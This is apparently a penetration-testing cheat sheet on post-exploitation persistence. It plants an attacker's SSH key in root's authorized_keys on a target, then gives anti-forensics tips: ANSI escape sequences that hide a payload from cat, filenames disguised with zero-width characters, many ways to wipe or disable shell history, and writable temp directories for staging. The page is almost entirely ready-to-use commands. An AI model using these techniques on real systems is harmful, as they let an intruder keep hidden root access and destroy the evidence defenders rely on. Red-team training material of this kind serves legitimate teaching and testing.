# SSH persistence password-less

```
kali@kali:~$ ssh-keygen

kali@kali:~$ cat:~/.ssh/id_rsa.pub
```

in the target shell type:

```
mkdir /root/.ssh
echo “rsa public key from kali machine” > /root/.ssh/authorized_keys
```

now login without password:

```
kali@kali:~$ ssh root@sandbox.local
```

## <mark style="color:red;">Tips</mark>

Hide the payload with ANSI chars, the following chars will clear the terminal when using cat to display the content of your payload.

```
#�[2J�[2J�[2J�[2H�[2A# Do not remove. Generated from /etc/issue.conf by configure.
```

Hide in plain sight using zero width spaces in filename.

```
touch $(echo -n 'index\u200D.php') index.php
```

Clear the last line of the history.

```
history -d $(history | tail -2 | awk '{print $1}') 2> /dev/null
```

Clear history:

```
[SPACE] ANY COMMAND
or
export HISTSIZE=0
export HISTFILESIZE=0
unset HISTFILE; CTRL-D
or
kill -9 $$
or
echo "" > ~/.bash_history
or
rm ~/.bash_history -rf
or
history -c
or
ln /dev/null ~/.bash_history -sf
```

The following directories are temporary and usually writable

```
/var/tmp/
/tmp/
/dev/shm/
```
